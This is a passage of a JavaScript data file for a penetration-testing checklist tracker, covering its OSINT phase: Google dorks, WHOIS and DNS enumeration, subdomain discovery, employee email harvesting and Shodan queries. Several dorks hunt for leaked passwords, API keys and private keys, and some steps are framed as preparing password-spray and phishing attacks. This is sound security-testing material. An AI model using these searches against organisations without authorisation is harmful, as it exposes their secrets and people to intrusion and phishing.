/* ═══════════════════════════════════════════════════════════════════
   Security Tracker – Checklist Data
   ═══════════════════════════════════════════════════════════════════
   EDITING GUIDE
   ─────────────
   Each phase is an object in the `checklistPhases` array below.

   Phase structure:
     {
       id:       "unique_phase_id",         // snake_case, must be unique
       name:     "Display Name",
       optional: true|false,                // optional phases can be toggled off
       items:    [ ...checklist items... ]
     }

   Item structure:
     {
       id:          "phase-N",              // convention: "<phase>-<number>"
       name:        "Item Name",
       description: "What this item checks or does.",
       commands: [                          // array of command groups
         {
           desc:    "Group heading",         // shown above the code block
           entries: [                        // array of subdesc/cmd pairs
             {
               subdesc: "Optional subheading",  // smaller text below heading
               cmd: [                            // each string = one line of output
                 "command1",
                 "command2 --flag"
               ]
             }
           ]
         }
       ]
     }

   Notes:
   • `cmd` arrays are joined with newlines at load time (normalizeMultiline).
   • The phase with id "active_directory_exploitation" is only shown
     for Windows machines — no extra config needed.
   • To add a new phase, copy an existing phase object and change its
     id/name/items.  The app picks up changes automatically.
   ═══════════════════════════════════════════════════════════════════ */

/** Join array-of-lines into a single newline-delimited string. */
function normalizeMultiline(value) {
  if (Array.isArray(value)) return value.join('\n');
  return value;
}

/**
 * Walk every phase → item → command entry and collapse
 * any `cmd` arrays into single strings (for <pre> rendering).
 */
function normalizeChecklistPhases(phases) {
  phases.forEach((phase) => {
    (phase.items || []).forEach((item) => {
      item.command = normalizeMultiline(item.command);
      if (Array.isArray(item.commands)) {
        item.commands.forEach((entry) => {
          if (Array.isArray(entry.entries)) {
            entry.entries.forEach((e) => {
              e.cmd = normalizeMultiline(e.cmd);
            });
          }
        });
      }
    });
  });
}

const checklistPhases = [
  /* ─── Phase 1: OSINT ──────────────────────────────────── */
  {
    "id": "osint",
    "name": "OSINT",
    "optional": true,
    "items": [
      {
        "id": "osint-1",
        "name": "Google Dorking",
        "description": "Use Google search operators to find exposed files, admin panels, directory listings, leaked credentials, and misconfigurations. Combine operators for high-value discovery.",
        "commands": [
          {
            "desc": "Target Scoping",
            "entries": [
              {
                "subdesc": "Narrow or expand search to specific domains and subdomains.",
                "cmd": [
                  "site:example.com",
                  "site:*.example.com",
                  "-site:example.com",
                  "site:example.com OR site:example.net"
                ]
              }
            ]
          },
          {
            "desc": "Logical Operators",
            "entries": [
              {
                "subdesc": "Combine search terms with AND/OR logic to refine and narrow dork queries",
                "cmd": [
                  "example1 AND example2",
                  "example1 OR example2",
                  "example1 | example2",
                  "example1 && example2",
                  "(example1 OR example2) AND example3"
                ]
              }
            ]
          },
          {
            "desc": "Wildcards & Fuzzing",
            "entries": [
              {
                "subdesc": "Use wildcards to discover partial matches and expand search coverage",
                "cmd": [
                  "example*test",
                  "example * test",
                  "admin*login",
                  "password*reset"
                ]
              }
            ]
          },
          {
            "desc": "Exact Matching / Ordering",
            "entries": [
              {
                "subdesc": "Force exact phrase matching for precise results on specific strings",
                "cmd": [
                  "\"example1 example2\"",
                  "\"example1 example2 example3\""
                ]
              }
            ]
          },
          {
            "desc": "File Type Discovery",
            "entries": [
              {
                "subdesc": "Search for documents, configs, backups, and archives that may contain sensitive data.",
                "cmd": [
                  "filetype:pdf",
                  "filetype:doc",
                  "filetype:docx",
                  "filetype:xls",
                  "filetype:xlsx",
                  "filetype:csv",
                  "filetype:txt",
                  "filetype:log",
                  "filetype:conf",
                  "filetype:cfg",
                  "filetype:ini",
                  "filetype:sql",
                  "filetype:bak",
                  "filetype:old",
                  "filetype:zip",
                  "filetype:rar",
                  "filetype:7z",
                  "filetype:tar",
                  "filetype:gz",
                  "filetype:json",
                  "filetype:xml",
                  "filetype:yml",
                  "filetype:yaml",
                  "filetype:pem",
                  "filetype:key",
                  "filetype:ovpn",
                  "filetype:rdp",
                  "site:example.com filetype:sql"
                ]
              }
            ]
          },
          {
            "desc": "URL-Based Discovery",
            "entries": [
              {
                "subdesc": "Find admin panels, login pages, API endpoints, and potentially injectable parameters.",
                "cmd": [
                  "inurl:admin",
                  "inurl:login",
                  "inurl:signin",
                  "inurl:signup",
                  "inurl:register",
                  "inurl:upload",
                  "inurl:download",
                  "inurl:backup",
                  "inurl:test",
                  "inurl:dev",
                  "inurl:staging",
                  "inurl:old",
                  "inurl:api",
                  "inurl:v1",
                  "inurl:v2",
                  "inurl:graphql",
                  "inurl:swagger",
                  "inurl:api-docs",
                  "inurl:php?id=",
                  "inurl:cmd=",
                  "inurl:exec=",
                  "inurl:query=",
                  "inurl:redirect=",
                  "inurl:url=",
                  "inurl:return=",
                  "inurl:next="
                ]
              }
            ]
          },
          {
            "desc": "Page Content Discovery",
            "entries": [
              {
                "subdesc": "Search for sensitive strings in page content — credentials, keys, internal labels.",
                "cmd": [
                  "intext:password",
                  "intext:username",
                  "intext:credentials",
                  "intext:apikey",
                  "intext:\"api key\"",
                  "intext:\"secret key\"",
                  "intext:\"access token\"",
                  "intext:\"confidential\"",
                  "intext:\"internal use only\"",
                  "intext:\"do not distribute\"",
                  "intext:\"not for public release\""
                ]
              }
            ]
          },
          {
            "desc": "Title-Based Discovery",
            "entries": [
              {
                "subdesc": "Find admin panels, directory listings, and server info via HTML page titles",
                "cmd": [
                  "intitle:admin",
                  "intitle:login",
                  "intitle:dashboard",
                  "intitle:index.of",
                  "intitle:\"index of\"",
                  "intitle:\"parent directory\"",
                  "intitle:\"Apache Status\"",
                  "intitle:\"PHP Version\""
                ]
              }
            ]
          },
          {
            "desc": "Directory Listings / Misconfigurations",
            "entries": [
              {
                "subdesc": "Exposed directory indexes often leak backup files, .git repos, configs, and credentials",
                "cmd": [
                  "intitle:\"index of\" \"backup\"",
                  "intitle:\"index of\" \".git\"",
                  "intitle:\"index of\" \".env\"",
                  "intitle:\"index of\" \".ssh\"",
                  "intitle:\"index of\" \"config\"",
                  "intitle:\"index of\" \"database\"",
                  "intitle:\"index of\" \"wp-content/uploads\""
                ]
              }
            ]
          },
          {
            "desc": "Technology Fingerprinting",
            "entries": [
              {
                "subdesc": "Identify CMS platforms, admin tools, and internal services via URL patterns",
                "cmd": [
                  "inurl:wp-admin",
                  "inurl:wp-content",
                  "inurl:wp-includes",
                  "inurl:phpmyadmin",
                  "intitle:phpMyAdmin",
                  "inurl:jira",
                  "inurl:confluence",
                  "inurl:jenkins",
                  "inurl:grafana",
                  "inurl:kibana",
                  "inurl:gitlab",
                  "inurl:sonarqube"
                ]
              }
            ]
          },
          {
            "desc": "Credentials & Secrets Leakage",
            "entries": [
              {
                "subdesc": "High-priority dorks for finding exposed secrets and private keys.",
                "cmd": [
                  "filetype:env \"DB_PASSWORD\"",
                  "filetype:env \"AWS_SECRET\"",
                  "filetype:env \"API_KEY\"",
                  "filetype:env \"SMTP_PASSWORD\"",
                  "filetype:json \"access_token\"",
                  "filetype:yaml \"password:\"",
                  "filetype:properties \"jdbc:\"",
                  "filetype:xml \"connectionString\"",
                  "intext:\"BEGIN RSA PRIVATE KEY\"",
                  "intext:\"BEGIN OPENSSH PRIVATE KEY\"",
                  "intext:\"BEGIN PGP PRIVATE KEY\"",
                  "filetype:ppk \"PuTTY-User-Key-File\""
                ]
              }
            ]
          },
          {
            "desc": "Cloud & DevOps Artifacts",
            "entries": [
              {
                "subdesc": "Find exposed IaC configs, container files, and cloud storage buckets",
                "cmd": [
                  "filetype:tf \"aws_\"",
                  "filetype:tfvars",
                  "filetype:dockerfile",
                  "filetype:docker-compose",
                  "filetype:helm",
                  "filetype:kubeconfig",
                  "filetype:yaml \"apiVersion\" \"kind\"",
                  "site:s3.amazonaws.com target",
                  "site:blob.core.windows.net target",
                  "site:storage.googleapis.com target"
                ]
              }
            ]
          },
          {
            "desc": "Error & Debug Exposure",
            "entries": [
              {
                "subdesc": "Discover stack traces, error messages, and debug flags leaking internal details",
                "cmd": [
                  "intext:\"stack trace\"",
                  "intext:\"exception\"",
                  "intext:\"fatal error\"",
                  "intext:\"debug=true\"",
                  "intext:\"syntax error\" filetype:log",
                  "intext:\"Warning: mysql\" site:example.com"
                ]
              }
            ]
          },
          {
            "desc": "User-Generated Content / Leaks",
            "entries": [
              {
                "subdesc": "Search code repos, paste sites, and Q&A sites for leaked target information.",
                "cmd": [
                  "site:pastebin.com example.com",
                  "site:github.com example.com",
                  "site:gitlab.com example.com",
                  "site:bitbucket.org example.com",
                  "site:stackoverflow.com \"example.com\"",
                  "site:trello.com example.com",
                  "site:notion.site example.com",
                  "site:docs.google.com example.com"
                ]
              }
            ]
          },
          {
            "desc": "Authentication & Access Control",
            "entries": [
              {
                "subdesc": "Find auth-related endpoints — password resets, SSO, OAuth, 2FA pages",
                "cmd": [
                  "inurl:reset",
                  "inurl:forgot",
                  "inurl:password",
                  "intitle:\"two-factor\"",
                  "intitle:\"2fa\"",
                  "inurl:sso",
                  "inurl:oauth",
                  "inurl:saml"
                ]
              }
            ]
          },
          {
            "desc": "Historical / Cached Data",
            "entries": [
              {
                "subdesc": "Access Google cache and Wayback Machine snapshots of target pages",
                "cmd": [
                  "cache:example.com",
                  "site:web.archive.org example.com"
                ]
              }
            ]
          },
          {
            "desc": "Removals / Noise Reduction",
            "entries": [
              {
                "subdesc": "Filter out social media and irrelevant results to focus on target data",
                "cmd": [
                  "-site:facebook.com",
                  "-site:twitter.com",
                  "-site:linkedin.com",
                  "-example -test -sample"
                ]
              }
            ]
          },
          {
            "desc": "High-Value Combined Patterns",
            "entries": [
              {
                "subdesc": "Stack multiple operators for precise, high-impact results.",
                "cmd": [
                  "site:example.com (filetype:env OR filetype:conf)",
                  "(inurl:admin OR inurl:login) site:example.com",
                  "intitle:\"index of\" (backup OR db OR sql)",
                  "site:example.com intext:password filetype:log",
                  "site:example.com (filetype:sql OR filetype:bak OR filetype:old)",
                  "site:example.com inurl:api (intext:key OR intext:token)",
                  "site:example.com ext:php inurl:config"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-2",
        "name": "WHOIS Lookup",
        "description": "Identify registration and ownership details for a domain or IP address. Pivot from WHOIS data to expand scope by finding related infrastructure.",
        "commands": [
          {
            "desc": "Basic Domain Registration",
            "entries": [
              {
                "subdesc": "Returns registrar, name servers, dates, contacts — first step in passive recon",
                "cmd": [
                  "whois target.com"
                ]
              }
            ]
          },
          {
            "desc": "Subdomain (may fall back to parent domain)",
            "entries": [
              {
                "subdesc": "WHOIS may not resolve subdomains — falls back to parent domain registration data",
                "cmd": [
                  "whois sub.target.com"
                ]
              }
            ]
          },
          {
            "desc": "IP Address Registration",
            "entries": [
              {
                "subdesc": "Look up IP ownership, netblock, and abuse contacts via RIR databases",
                "cmd": [
                  "whois 10.10.10.5",
                  "whois 8.8.8.8"
                ]
              }
            ]
          },
          {
            "desc": "CIDR / Netblock Ownership",
            "entries": [
              {
                "subdesc": "Identify the full IP range allocated to the target organization",
                "cmd": [
                  "whois 10.10.10.0/24"
                ]
              }
            ]
          },
          {
            "desc": "TLD-Specific WHOIS (bypasses generic resolvers)",
            "entries": [
              {
                "subdesc": "Query TLD authoritative WHOIS servers directly for more complete data",
                "cmd": [
                  "whois -h whois.verisign-grs.com target.com",
                  "whois -h whois.iana.org target.com"
                ]
              }
            ]
          },
          {
            "desc": "Registrar-Specific WHOIS",
            "entries": [
              {
                "subdesc": "Query the registrar WHOIS server for additional registration details",
                "cmd": [
                  "whois -h whois.godaddy.com target.com",
                  "whois -h whois.namecheap.com target.com"
                ]
              }
            ]
          },
          {
            "desc": "Nameserver Enumeration",
            "entries": [
              {
                "subdesc": "Extract nameservers — pivot to zone transfer testing and DNS enumeration",
                "cmd": [
                  "whois target.com | grep -i \"name server\"",
                  "whois target.com | grep -i \"nserver\""
                ]
              }
            ]
          },
          {
            "desc": "Registrar / Organization / Abuse Contacts",
            "entries": [
              {
                "subdesc": "Identify registrar, organization name, and abuse contact for the domain",
                "cmd": [
                  "whois target.com | grep -i \"registrar\"",
                  "whois target.com | grep -i \"org\"",
                  "whois target.com | grep -i \"abuse\""
                ]
              }
            ]
          },
          {
            "desc": "Dates (Attack Surface Timing)",
            "entries": [
              {
                "subdesc": "Recently updated domains may have new infrastructure changes worth investigating.",
                "cmd": [
                  "whois target.com | grep -i \"creation\"",
                  "whois target.com | grep -i \"updated\"",
                  "whois target.com | grep -i \"expiry\""
                ]
              }
            ]
          },
          {
            "desc": "Reverse WHOIS (email / org reuse indicators)",
            "entries": [
              {
                "subdesc": "Find other domains registered with the same email or organization.",
                "cmd": [
                  "whois target.com | grep -Ei \"email|e-mail|mail\""
                ]
              }
            ]
          },
          {
            "desc": "ASN Discovery (pivot to infrastructure scope)",
            "entries": [
              {
                "subdesc": "Find the Autonomous System Number for the target's IP space — pivot to netblock discovery",
                "cmd": [
                  "whois 10.10.10.5 | grep -i \"origin\"",
                  "whois 10.10.10.5 | grep -i \"asn\""
                ]
              }
            ]
          },
          {
            "desc": "RIR-Specific Queries",
            "entries": [
              {
                "subdesc": "Query the specific Regional Internet Registry for more detailed IP ownership info.",
                "cmd": [
                  "whois -h whois.arin.net 10.10.10.5",
                  "whois -h whois.ripe.net 10.10.10.5",
                  "whois -h whois.apnic.net 10.10.10.5",
                  "whois -h whois.lacnic.net 10.10.10.5",
                  "whois -h whois.afrinic.net 10.10.10.5"
                ]
              }
            ]
          },
          {
            "desc": "Organization Netblocks (scope expansion candidate)",
            "entries": [
              {
                "subdesc": "Discover the full IP range and CIDR block allocated to the target organization",
                "cmd": [
                  "whois 10.10.10.5 | grep -i \"netrange\"",
                  "whois 10.10.10.5 | grep -i \"cidr\""
                ]
              }
            ]
          },
          {
            "desc": "Privacy / Proxy Detection",
            "entries": [
              {
                "subdesc": "Check if WHOIS data is hidden behind privacy protection or proxy services",
                "cmd": [
                  "whois target.com | grep -Ei \"privacy|proxy|redacted\""
                ]
              }
            ]
          },
          {
            "desc": "Email Infrastructure Clues",
            "entries": [
              {
                "subdesc": "Extract mail-related records from WHOIS data to identify email infrastructure",
                "cmd": [
                  "whois target.com | grep -Ei \"mx|mail\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-3",
        "name": "DNS Enumeration",
        "description": "Enumerate DNS records to map infrastructure, discover hidden services, and find misconfigurations like zone transfer vulnerabilities.",
        "commands": [
          {
            "desc": "DNS Banner Grabbing",
            "entries": [
              {
                "subdesc": "Identify DNS server software version for vulnerability research.",
                "cmd": [
                  "dig @<TARGET_IP> version.bind CHAOS TXT",
                  "nmap -sV -p 53 --script=dns-nsid -Pn <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "Standard Record Queries",
            "entries": [
              {
                "subdesc": "Query specific DNS record types to map infrastructure. A=IPv4, AAAA=IPv6, MX=mail, NS=nameservers, TXT=SPF/DKIM/DMARC, SOA=zone info, SRV=services, CNAME=aliases.",
                "cmd": [
                  "dig @<DNS_SERVER> <DOMAIN> A",
                  "dig @<DNS_SERVER> <DOMAIN> AAAA",
                  "dig @<DNS_SERVER> <DOMAIN> MX",
                  "dig @<DNS_SERVER> <DOMAIN> NS",
                  "dig @<DNS_SERVER> <DOMAIN> TXT",
                  "dig @<DNS_SERVER> <DOMAIN> SOA",
                  "dig @<DNS_SERVER> <DOMAIN> SRV",
                  "dig @<DNS_SERVER> <DOMAIN> CNAME",
                  "dig @<DNS_SERVER> <DOMAIN> ANY",
                  "dig +short <DOMAIN> A",
                  "dig +short <DOMAIN> MX",
                  "dig +short <DOMAIN> NS"
                ]
              }
            ]
          },
          {
            "desc": "Reverse DNS Lookups",
            "entries": [
              {
                "subdesc": "Resolve IP addresses back to hostnames — useful for discovering additional domains on shared infrastructure.",
                "cmd": [
                  "dig @<DNS_SERVER> -x <IP_ADDRESS>",
                  "host <IP_ADDRESS>",
                  "nslookup <IP_ADDRESS>",
                  "for ip in $(seq 1 254); do host 10.10.10.$ip <DNS_SERVER> 2>/dev/null | grep 'name pointer'; done"
                ]
              }
            ]
          },
          {
            "desc": "DNS Enumeration (host / nslookup)",
            "entries": [
              {
                "subdesc": "Alternative DNS query tools — lightweight and useful when dig is unavailable",
                "cmd": [
                  "host <HOSTNAME> <DNS_SERVER>",
                  "host -t mx <DOMAIN>",
                  "host -t ns <DOMAIN>",
                  "host -t txt <DOMAIN>",
                  "host -l <DOMAIN> <DNS_SERVER>",
                  "nslookup <DOMAIN>",
                  "nslookup -type=mx <DOMAIN>",
                  "nslookup -type=ns <DOMAIN>",
                  "nslookup -type=soa <DOMAIN>"
                ]
              }
            ]
          },
          {
            "desc": "DNS Zone Transfer Attacks",
            "entries": [
              {
                "subdesc": "Zone transfers (AXFR) expose the entire DNS zone if misconfigured — reveals all subdomains, IPs, and records.",
                "cmd": [
                  "dig @<DOMAIN_IP> <DOMAIN> AXFR",
                  "dig @ns1.<DOMAIN> <DOMAIN> AXFR",
                  "host -T -l <DOMAIN> <DNS_SERVER>",
                  "host -l <DOMAIN> <DNS_SERVER>",
                  "dnsrecon -d <DOMAIN> -a",
                  "dnsrecon -d <DOMAIN> -t axfr",
                  "fierce --domain <DOMAIN>"
                ]
              }
            ]
          },
          {
            "desc": "TLS CN → DNS Zone Transfer Check",
            "entries": [
              {
                "subdesc": "If nmap shows a TLS cert with commonName=mysite.test and DNS service is running, test for misconfigured AXFR.",
                "cmd": [
                  "host -T -l <DOMAIN.LOCAL> <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "DNS Brute Force Enumeration",
            "entries": [
              {
                "subdesc": "Brute force subdomains through the DNS server directly.",
                "cmd": [
                  "dnsenum <DOMAIN>",
                  "dnsenum --dnsserver <DNS_SERVER> --enum <DOMAIN>",
                  "dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt",
                  "gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100",
                  "gobuster dns -r <TARGET_IP> -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100"
                ]
              }
            ]
          },
          {
            "desc": "Virtual Host (VHost) Discovery",
            "entries": [
              {
                "subdesc": "Find sites hosted on the same server using different Host headers.",
                "cmd": [
                  "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185",
                  "gobuster vhost -u http://<RHOST> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
                  "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.<RHOST>\" --hc 404 http://<RHOST>"
                ]
              }
            ]
          },
          {
            "desc": "Email Security Records",
            "entries": [
              {
                "subdesc": "Check for SPF, DKIM, and DMARC — missing records = spoofing/phishing opportunity.",
                "cmd": [
                  "dig +short <DOMAIN> TXT | grep spf",
                  "dig +short _dmarc.<DOMAIN> TXT",
                  "dig +short default._domainkey.<DOMAIN> TXT",
                  "nmap -p 25 --script smtp-open-relay <TARGET_IP>",
                  "nmap --script=dns-srv-enum -p 53 <DNS_SERVER>"
                ]
              }
            ]
          },
          {
            "desc": "DNS Configuration Files (Linux)",
            "entries": [
              {
                "subdesc": "If you have local/post-exploit access, check DNS configuration files.",
                "cmd": [
                  "cat /etc/host.conf",
                  "cat /etc/resolv.conf",
                  "cat /etc/named.conf",
                  "cat /etc/bind/named.conf",
                  "cat /etc/bind/named.conf.local"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-4",
        "name": "Subdomain Enumeration",
        "description": "Discover subdomains using passive (API-based) and active (brute force, permutation) enumeration methods. Combine multiple tools for maximum coverage.",
        "commands": [
          {
            "desc": "Install Subdomain Enumeration Tools",
            "entries": [
              {
                "subdesc": "Install Go (if not installed)",
                "cmd": [
                  "sudo apt install -y golang-go"
                ]
              },
              {
                "subdesc": "ProjectDiscovery tools (subfinder, httpx, nuclei)",
                "cmd": [
                  "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
                  "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
                  "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
                  "go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
                ]
              },
              {
                "subdesc": "Other Go tools",
                "cmd": [
                  "go install -v github.com/tomnomnom/assetfinder@latest",
                  "go install -v github.com/tomnomnom/httprobe@latest",
                  "go install -v github.com/sensepost/gowitness@latest",
                  "go install -v github.com/OJ/gobuster/v3@latest",
                  "go install -v github.com/Josue87/gotator@latest",
                  "go install -v github.com/haccer/subjack@latest"
                ]
              },
              {
                "subdesc": "Rust / other binaries",
                "cmd": [
                  "# findomain: download from https://github.com/Edu4rdSHL/findomain/releases"
                ]
              },
              {
                "subdesc": "Python tools",
                "cmd": [
                  "pip install altdns"
                ]
              },
              {
                "subdesc": "massdns (compile from source)",
                "cmd": [
                  "git clone https://github.com/blechschmidt/massdns.git && cd massdns && make && sudo make install"
                ]
              },
              {
                "subdesc": "Add Go bin to PATH (add to .bashrc/.zshrc)",
                "cmd": [
                  "export PATH=$PATH:$(go env GOPATH)/bin"
                ]
              }
            ]
          },
          {
            "desc": "Passive Subdomain Discovery (subfinder)",
            "entries": [
              {
                "subdesc": "Queries 40+ passive sources (crt.sh, VirusTotal, Shodan, SecurityTrails, etc.).",
                "cmd": [
                  "subfinder -d target.com -silent -o subdomains.txt",
                  "subfinder -d target.com -all -recursive -json -o subfinder.json",
                  "subfinder -d target.com -all -silent | sort -u > subs.txt"
                ]
              }
            ]
          },
          {
            "desc": "Passive Subdomain Discovery (amass)",
            "entries": [
              {
                "subdesc": "Deep passive and active enumeration with graph database support.",
                "cmd": [
                  "amass enum -passive -d target.com -o amass_passive.txt",
                  "amass enum -passive -d target.com -src -o amass_sources.txt",
                  "amass intel -d target.com -whois"
                ]
              }
            ]
          },
          {
            "desc": "Active Subdomain Enumeration",
            "entries": [
              {
                "subdesc": "Active DNS brute-forcing — use only when allowed by scope.",
                "cmd": [
                  "amass enum -active -d target.com -o amass_active.txt",
                  "amass enum -brute -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o amass_bruteforce.txt",
                  "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100",
                  "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.target.com -mc 200,301,302,403"
                ]
              }
            ]
          },
          {
            "desc": "Certificate Transparency Logs",
            "entries": [
              {
                "subdesc": "crt.sh queries Certificate Transparency logs for all certificates issued to a domain — reveals subdomains the org may not intend to be public.",
                "cmd": [
                  "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u",
                  "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crt_subs.txt"
                ]
              }
            ]
          },
          {
            "desc": "Assetfinder & Other Tools",
            "entries": [
              {
                "subdesc": "Lightweight tools for quick subdomain enumeration.",
                "cmd": [
                  "assetfinder target.com | sort -u",
                  "assetfinder --subs-only target.com",
                  "findomain -t target.com -u findomain_subs.txt",
                  "chaos -d target.com -silent"
                ]
              }
            ]
          },
          {
            "desc": "Subdomain Permutation & Alteration",
            "entries": [
              {
                "subdesc": "Generate permutations of known subdomains to find patterns like dev-api, api-staging, etc.",
                "cmd": [
                  "altdns -i subdomains.txt -o permutation_output.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -s results.txt",
                  "gotator -sub subdomains.txt -perm /usr/share/seclists/Discovery/DNS/dns-prefixes.txt -depth 1 -numbers 3 | massdns -r resolvers.txt -o S -w resolved.txt"
                ]
              }
            ]
          },
          {
            "desc": "Probe Live Subdomains",
            "entries": [
              {
                "subdesc": "Filter discovered subdomains to only those that are actually responding.",
                "cmd": [
                  "cat subdomains.txt | httprobe -prefer-https | tee alive.txt",
                  "httpx -l subdomains.txt -silent -status-code -title -tech-detect -o httpx_results.txt",
                  "httpx -l subdomains.txt -silent -sc -cl -ct -title -server -td -cdn -o httpx_full.txt"
                ]
              }
            ]
          },
          {
            "desc": "Visual Recon (Screenshots)",
            "entries": [
              {
                "subdesc": "Capture screenshots of all discovered live subdomains for rapid visual analysis.",
                "cmd": [
                  "gowitness file -f alive.txt -P screenshots/ --no-http",
                  "eyewitness --web -f alive.txt -d eyewitness_output/ --no-prompt"
                ]
              }
            ]
          },
          {
            "desc": "Subdomain Takeover Detection",
            "entries": [
              {
                "subdesc": "Check if any discovered subdomains have dangling CNAME records that could be claimed.",
                "cmd": [
                  "subjack -w subdomains.txt -t 100 -timeout 30 -o takeover_results.txt -ssl",
                  "nuclei -l subdomains.txt -t takeovers/ -o nuclei_takeover.txt",
                  "cat subdomains.txt | while read sub; do cname=$(dig +short CNAME $sub); [ -n \"$cname\" ] && echo \"$sub -> $cname\"; done"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-5",
        "name": "Email Harvesting & OSINT",
        "description": "Discover, verify, and harvest email addresses tied to a target domain. Identify email format patterns for spray attacks. Combine CLI tools with online services.",
        "commands": [
          {
            "desc": "theHarvester (Multi-Source)",
            "entries": [
              {
                "subdesc": "Queries search engines, PGP servers, Shodan, and more for emails, subdomains, hosts, and names.",
                "cmd": [
                  "theHarvester -d target.com -b all",
                  "theHarvester -d target.com -b google,bing,linkedin,yahoo",
                  "theHarvester -d target.com -b all -l 500 -f results.html",
                  "theHarvester -d target.com -b crtsh,dnsdumpster,certspotter"
                ]
              }
            ]
          },
          {
            "desc": "Email Discovery Platforms (Online)",
            "entries": [
              {
                "subdesc": "Web-based tools for discovering email addresses and format patterns.",
                "cmd": [
                  "https://hunter.io/               # Email finder + format detection",
                  "https://phonebook.cz/             # Email, domain, URL search",
                  "https://www.voilanorbert.com/      # Email finder by name + domain",
                  "https://snov.io/                   # Email finder + verifier",
                  "https://rocketreach.co/            # Email + phone lookup"
                ]
              }
            ]
          },
          {
            "desc": "Email Verification",
            "entries": [
              {
                "subdesc": "Verify discovered emails are valid before using in attacks — reduces bounce detection.",
                "cmd": [
                  "https://tools.verifyemailaddress.io/",
                  "https://email-checker.net/validate",
                  "emailhippo <EMAIL_ADDRESS>"
                ]
              }
            ]
          },
          {
            "desc": "LinkedIn Email Harvesting",
            "entries": [
              {
                "subdesc": "Build employee email lists from LinkedIn profiles. Install: pip install crosslinked | linkedin2username: git clone https://github.com/initstring/linkedin2username",
                "cmd": [
                  "linkedin2username -u <LINKEDIN_USER> -c <COMPANY_NAME> -s <COMPANY_SIZE>",
                  "crosslinked -f '{first}.{last}@target.com' -j 3 'Company Name'"
                ]
              }
            ]
          },
          {
            "desc": "SMTP Enumeration",
            "entries": [
              {
                "subdesc": "If SMTP is reachable, enumerate valid email addresses directly through the mail server.",
                "cmd": [
                  "smtp-user-enum -M VRFY -U users.txt -t <MAIL_SERVER>",
                  "smtp-user-enum -M RCPT -U users.txt -t <MAIL_SERVER>",
                  "smtp-user-enum -M EXPN -U users.txt -t <MAIL_SERVER>",
                  "nmap --script smtp-enum-users -p 25 <MAIL_SERVER>"
                ]
              }
            ]
          },
          {
            "desc": "Clearbit Connect",
            "entries": [
              {
                "subdesc": "Chrome extension that reveals email addresses and company info directly in Gmail.",
                "cmd": [
                  "Install Clearbit Connect Chrome extension",
                  "Open Gmail → Compose → Click Clearbit icon → Search by name + company"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-6",
        "name": "Shodan / Censys / Search Engines",
        "description": "Find exposed services, open ports, banners, vulnerabilities, and IoT devices indexed by internet-wide scanners. No direct scanning needed — passive reconnaissance.",
        "commands": [
          {
            "desc": "Shodan CLI — Host & Domain Lookup",
            "entries": [
              {
                "subdesc": "Query Shodan's database for all indexed data on a target.",
                "cmd": [
                  "shodan host <TARGET_IP>",
                  "shodan search hostname:target.com",
                  "shodan domain target.com",
                  "shodan count hostname:target.com"
                ]
              }
            ]
          },
          {
            "desc": "Shodan Search Filters",
            "entries": [
              {
                "subdesc": "Powerful filters for narrowing results to specific services, vulnerabilities, and configurations.",
                "cmd": [
                  "shodan search 'hostname:target.com port:443'",
                  "shodan search 'org:\"Target Company\" port:3389'",
                  "shodan search 'ssl.cert.subject.cn:target.com'",
                  "shodan search 'net:10.10.10.0/24'",
                  "shodan search 'product:Apache city:\"New York\"'",
                  "shodan search 'vuln:CVE-2021-44228'",
                  "shodan search 'http.title:\"Dashboard\" org:\"Target Company\"'",
                  "shodan search 'port:445 os:\"Windows\" org:\"Target\"'",
                  "shodan search 'http.favicon.hash:<HASH>'",
                  "shodan search 'ssl:\"target.com\" 200'"
                ]
              }
            ]
          },
          {
            "desc": "Shodan Web Interface Dorks",
            "entries": [
              {
                "subdesc": "Use these directly on shodan.io search bar.",
                "cmd": [
                  "hostname:target.com",
                  "org:\"Target Company\"",
                  "net:10.10.10.0/24",
                  "ssl.cert.issuer.cn:\"Let's Encrypt\"",
                  "http.component:\"WordPress\"",
                  "product:\"OpenSSH\" port:22",
                  "http.status:200 hostname:target.com",
                  "has_screenshot:true hostname:target.com"
                ]
              }
            ]
          },
          {
            "desc": "Censys Search",
            "entries": [
              {
                "subdesc": "Alternative to Shodan with different scanning coverage and certificate search.",
                "cmd": [
                  "https://search.censys.io/",
                  "censys search 'services.tls.certificates.leaf.names: target.com'",
                  "censys search 'ip: 10.10.10.5'",
                  "censys search 'services.http.response.html_title: \"target\"'"
                ]
              }
            ]
          },
          {
            "desc": "Other Search Engines",
            "entries": [
              {
                "subdesc": "Alternative internet scanning platforms with different coverage and focus areas",
                "cmd": [
                  "https://www.zoomeye.org/         # Chinese Shodan equivalent",
                  "https://fofa.info/               # Chinese search engine for internet assets",
                  "https://www.binaryedge.io/       # Internet scan data",
                  "https://www.onyphe.io/           # Cyber defense search engine",
                  "https://hunter.how/              # Global internet asset search"
                ]
              }
